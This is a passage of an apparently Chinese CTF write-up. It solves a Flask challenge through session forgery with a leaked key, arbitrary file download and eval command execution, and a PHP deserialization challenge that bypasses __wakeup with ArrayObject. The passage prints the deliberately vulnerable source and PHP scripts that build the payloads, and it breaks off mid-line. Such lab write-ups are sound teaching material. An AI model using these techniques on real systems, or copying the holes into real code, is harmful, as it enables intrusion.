id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>题目</p><p><img src="../images/image-20230404164641841.png" alt="image-20230404164641841"></p><p><strong>考点</strong></p><p><strong>flask的session伪造  +  任意文件下载  +  python命令执行</strong></p><p>这里注册的时候尝试使用admin账户注册，然后发现了这个账户存在，然后就注册个其他账户进行登录查看</p><p><img src="../images/image-20230404164920975.png" alt="image-20230404164920975"></p><p>这里的话应该要成为管理员才能进行获取flag</p><p>然后点击learn</p><p><img src="../images/image-20230404165019779.png" alt="image-20230404165019779"></p><p>看到了一些代码，这里我看到給key的时候，我就想到了是不是考的是<strong>session伪造或则是python反序列化</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"><span class="comment"># Check if user is loggedin</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br></pre></td></tr></table></figure><p>那么我们就去进行seesion伪造试试</p><p><img src="../images/image-20230404165301393.png" alt="image-20230404165301393"></p><p>拿到session</p><p><img src="../images/image-20230404170039525.png" alt="image-20230404170039525"></p><p>session伪造成功了</p><p><img src="../images/image-20230404170123835.png" alt="image-20230404170123835"></p><p>然后登录管理员账户成功，接下来就是有个下载的接口</p><p><img src="../images/image-20230404170215806.png" alt="image-20230404170215806"></p><p>发现是个假的flag</p><p><img src="../images/image-20230404170320851.png" alt="image-20230404170320851"></p><p>发现他是这样下载文件的，，然后我们就可以尝试下载完整的源码进行查看</p><p><strong>app.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: &#123;<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;LKHSADSFHLA;KHLK;FSDHLK;ASFD&#x27;</span>, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># Check if user is loggedin</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> password == users[username][<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            session[<span class="string">&#x27;loggedin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            session[<span class="string">&#x27;role&#x27;</span>] = users[username][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            msg = <span class="string">&#x27;Incorrect username/password!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> request.form:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            msg = <span class="string">&#x27;Account already exists!&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: password, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>&#125;</span><br><span class="line">            msg = <span class="string">&#x27;You have successfully registered!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register2.html&#x27;</span>, msg=msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/profile/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;profile2.html&#x27;</span>, username=session[<span class="string">&#x27;username&#x27;</span>], role=session[<span class="string">&#x27;role&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/show/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;show2.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;filename&#x27;</span> <span class="keyword">in</span> request.args:              </span><br><span class="line">            <span class="keyword">return</span> send_file(filename, as_attachment=<span class="literal">True</span>)</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = request.args.get(<span class="string">&#x27;eval&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;hello,<span class="subst">&#123;<span class="built_in">eval</span>(s)&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">   session.pop(<span class="string">&#x27;loggedin&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;id&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   session.pop(<span class="string">&#x27;role&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">   <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后发现在hello路由那，发现有eval命令，然后就进行传值，eval为参数</p><p>然后源码里没有os库，那么我们就自己传一个os库进去</p><p><img src="../images/image-20230404170910299.png" alt="image-20230404170910299"></p><p>成功拿到flag</p><p>遇到这种给key的题，一般都是考seesion伪造或则是python的pickel反序列化</p><h2 id="暗网聊天室"><a href="#暗网聊天室" class="headerlink" title="暗网聊天室"></a>暗网聊天室</h2><p>题目</p><p><img src="../images/image-20230404173019155.png" alt="image-20230404173019155"></p><p><strong>公钥加密       私钥解密</strong></p><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy_php"></a>easy_php</h2><p>题目</p><p><a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">别人的总结wp</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-24 10:16:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-25 00:25:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1+1&gt;2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>漏洞影响版本：</strong></p><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p><p>修改属性值是这些版本才有用，这里的话是没有用的</p><p>考点：PHP7.3 __wakeup绕过，ArrayObject内置类</p><p>众所周知可以使用C进行绕过wakeup，但这样有一个缺点，就是你把O改为C后是没办法有属性的，那假如需要用属性命令执行就不行了QWQ</p><p>这种情况我们可以用内置类<strong>ArrayObject</strong>，这个内置类序列化结果如下</p><p><img src="../images/image-20230404175635385.png" alt="image-20230404175635385"></p><p>这个题目很明显就是要执行system方法，然后不可以以<code>O\a</code>打头，假如不ban掉a的话，我们可以在a数组里面放上我们的恶意对象，也可以反序列化，但是这里都去掉了，所以回到上面说的那个ArrayObject，他是C开头的，并且可以绕过O，然后还可以带属性反序列化，符合条件，因此可以构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfshow;</span><br><span class="line"><span class="variable">$a</span>-&gt;ctfshow=<span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$oa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="comment">//unserialize($res)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.scuctf.com/ctfwiki/web/5.unserialize/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化a开头的使用</a></p><p><strong>查找脚本</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();<span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;unserialize&#x27;</span>,</span><br><span class="line"></span><br><span class="line">        ))) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230404181426665.png" alt="image-20230404181426665"></p><p>结果如下，注意到了还有ArrayIterator，实现了unserialize接口的大概率是C打头，因此在这几个类中寻找！</p><p>测试发现ArrayIterrator是可以的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-24 10:16:33</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-25 00:25:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfshow;</span><br><span class="line"><span class="variable">$a</span>-&gt;ctfshow=<span class="string">&quot;cat 